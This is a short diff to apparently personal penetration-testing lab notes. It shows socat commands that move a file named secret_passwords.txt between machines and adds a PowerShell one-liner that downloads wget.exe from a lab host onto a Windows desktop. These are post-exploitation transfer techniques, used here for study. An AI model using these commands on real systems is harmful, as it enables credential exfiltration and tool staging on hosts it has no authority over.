@@ -1,4 +1,4 @@
-------------------------------------------
+--------------------------------------------------------------------
 
 ** Socat file transfer
 
@@ -7,3 +7,8 @@ $ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
 
 Machine requesting the file
 $ socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+
+--------------------------------------------------------------------
+** Powershell file download
+
+C:\Users\offsec> powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/ /10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
